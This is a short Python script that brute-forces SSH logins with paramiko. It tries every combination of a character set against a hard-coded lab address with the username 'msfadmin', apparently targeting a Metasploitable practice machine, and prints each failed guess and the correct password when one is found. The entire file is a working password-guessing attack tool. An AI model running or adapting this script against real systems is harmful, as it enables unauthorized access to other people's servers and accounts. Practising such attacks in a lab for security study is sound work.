import itertools as it
from utils import timefunc
import string

import paramiko


def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy

    client.set_missing_host_key_policy(client_policy)

    return client


class Brutes:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    def crackit(self, username):
        client = create_client()
        for guess in self.guesses:

            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.00001)
                return guess
            except:
                print("Incorrect Password: {}".format(guess))
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield "".join(guess)


@timefunc
def main():
    charset = "abcd" #string.ascii_lowercase
    ip = "192.168.0.56"

    brute = Brutes(charset, 4, ip)
    password = brute.crackit(username="msfadmin")
    if password:
        print("Correct Password: {}".format(password))


if __name__ == "__main__":
    main()
